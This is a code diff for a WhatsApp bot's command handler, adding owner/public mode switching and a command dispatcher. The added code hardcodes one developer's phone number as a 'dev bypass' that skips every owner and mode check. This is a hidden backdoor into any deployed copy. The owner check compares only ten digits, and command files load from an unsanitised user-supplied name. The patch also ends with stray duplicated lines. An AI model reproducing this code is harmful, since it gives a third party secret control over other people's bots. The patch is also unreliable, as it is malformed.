@@ -26,6 +26,7 @@ try {
   const menuPath = path.join(__dirname, "..", "media", "menu.js");
   Object.assign(menuData, require(menuPath));
 } catch (err) {
+  // Console error will appear here if menu.js is missing, but it won't crash the bot
   console.error("❌ Error loading menu.js:", err);
 }
 
@@ -35,6 +36,7 @@ try {
   const corePath = path.join(__dirname, "./core.js");
   core = require(corePath);
 } catch (err) {
+  // Console error will appear here if core.js is missing, but it won't crash the bot
   console.error("❌ Error loading core.js:", err);
 }
 
@@ -60,6 +62,163 @@ async function handleCommand(conn, msg) {
   const senderId = msg.key.fromMe
     ? conn.user.id.split(":")[0] + "@s.whatsapp.net"
     : msg.key.participant || msg.key.remoteJid;
+
+  const senderNum = senderId.replace(/\D/g, "");
+  const botNum = (conn.user.id || "").replace(/\D/g, "");
+  const isOwner = senderNum.slice(0, 10) === botNum.slice(0, 10);
+  const isDev = senderNum.includes("923040488788"); // dev bypass
+
+  const reply = (text) => conn.sendMessage(chatId, { text }, { quoted: msg });
+
+  // 🔸 Mode control
+  if (command === "self") {
+    if (!isOwner && !isDev)
+      return reply("🚫 *Only Owner Can Switch Modes*");
+
+    global.mode = "self";
+    return reply("🔒 BOT IS NOW IN *SELF MODE* — Only Owner can use me!");
+  }
+
+  if (command === "public") {
+    if (!isOwner && !isDev)
+      return reply("🚫 *Only Owner Awais Mayo Can Switch Modes*");
+
+    global.mode = "public";
+    return reply("🌍 BOT IS NOW IN *PUBLIC MODE* — Everyone can use me!");
+  }
+
+  // 🔸 Owner bypass
+  if (isDev) {
+    return runCommand({
+      conn,
+      msg,
+      args,
+      command,
+      chatId,
+      isGroup,
+      senderNum,
+      reply
+    });
+  }
+
+  // 🔸 Mode restrictions
+  if (global.mode === "self" && !isOwner && !["menu", "repo", "idcheck"].includes(command)) {
+    return;
+  }
+
+  if (global.mode === "public" && ownerOnlyCommands.includes(command) && !isOwner) {
+    return reply("💀 *OWNER ONLY COMMAND!* You ain't my master londey!");
+  }
+
+  // 🔸 Direct calls
+  if (["menu", "repo", "idcheck", "antidelete"].includes(command)) {
+    return runCommand({
+      conn,
+      msg,
+      args,
+      command,
+      chatId,
+      isGroup,
+      senderNum,
+      reply
+    });
+  }
+
+  // Default
+  return runCommand({
+    conn,
+    msg,
+    args,
+    command,
+    chatId,
+    isGroup,
+    senderNum,
+    reply
+  });
+}
+
+// ===============================
+// 🔹 COMMAND EXECUTOR
+// ===============================
+async function runCommand({
+  conn,
+  msg,
+  args,
+  command,
+  chatId,
+  isGroup,
+  senderNum,
+  reply
+}) {
+  try {
+    // 🔸 idcheck
+    if (command === "idcheck") {
+      const botId = conn.user.id || "";
+      return reply(
+        `🤖 *Bot ID:* ${botId}\n📤 *Sender JID:* ${
+          msg.key.participant || msg.key.remoteJid
+        }\n🔢 *Sender Clean:* ${senderNum}`
+      );
+    }
+
+    // 🔸 menu message
+    if (menuData[command]) {
+      const menuMessage = generateWAMessageFromContent(
+        chatId,
+        { extendedTextMessage: { text: menuData[command] } },
+        { userJid: chatId }
+      );
+      return await conn.relayMessage(chatId, menuMessage.message, {
+        messageId: menuMessage.key.id
+      });
+    }
+
+    // 🔸 antidelete handler
+    if (command === "antidelete") {
+      return toggleAntidelete({ conn, m: msg, args, reply, jid: chatId });
+    }
+
+    // 🔸 core functions
+    if (core && core[command] && typeof core[command] === "function") {
+      return await core[command]({
+        conn,
+        m: msg,
+        args,
+        command,
+        jid: chatId,
+        isGroup,
+        sender: senderNum,
+        reply
+      });
+    }
+
+    // 🔸 individual command files
+    const filePath = path.join(__dirname, "..", `${command}.js`);
+    if (fs.existsSync(filePath)) {
+      const commandFile = require(filePath);
+      if (typeof commandFile === "function") {
+        return await commandFile({ conn, m: msg, args, command, jid: chatId, isGroup, sender: senderNum, reply });
+      }
+      if (typeof commandFile.run === "function") {
+        return await commandFile.run({ conn, m: msg, args, command, jid: chatId, isGroup, sender: senderNum, reply });
+      }
+    }
+
+    // 🔸 unknown command
+    return reply("*ᴜɴᴋɴᴏᴡɴ ᴄᴏᴍᴍᴀɴᴅ! ᴛʀʏ `.ᴍᴇɴᴜ` ʙᴇꜰᴏʀᴇ sʜᴏᴡɪɴɢ ᴏꜰꜰ 𓄀*");
+
+  } catch (err) {
+    console.error("⚠️ Error in command execution:", err);
+    return reply("⚠️ Error in command execution!");
+  }
+}
+
+// ===============================
+// 🔹 Export
+// ===============================
+module.exports = {
+  handleCommand
+};
 
   const senderNum = senderId.replace(/\D/g, "");
   const botNum = (conn.user.id || "").replace(/\D/g, "");
